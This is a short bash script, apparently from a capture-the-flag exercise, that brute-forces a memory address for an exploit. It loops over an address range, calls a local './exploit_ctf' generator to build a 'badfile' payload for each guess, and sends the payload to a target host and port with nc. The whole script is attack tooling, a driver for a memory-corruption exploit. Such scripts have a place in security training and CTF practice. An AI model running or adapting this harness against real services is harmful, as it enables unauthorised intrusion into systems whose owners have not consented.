#!/bin/bash
S_ADDR=$1
E_ADDR=$2
E_DIST=$3
Host=$4
Port=$5

#S_ADDR=$(( ( ${S_ADDR}/4 ) * 4  ))
#E_ADDR=$(( ( ${E_ADDR}/4 + 1 ) * 4  ))
#STEP=$(( ( ${E_DIST}/4 ) * 4 ))

for (( addr=${S_ADDR}; addr<=${E_ADDR}; addr+=2000 ))
do
	echo "obase=16;${addr};"|bc   
	./exploit_ctf ${addr} 2000 ${E_DIST} 
        cat badfile | nc ${Host} ${Port} 2>&1 >/dev/null 
done
exit 0
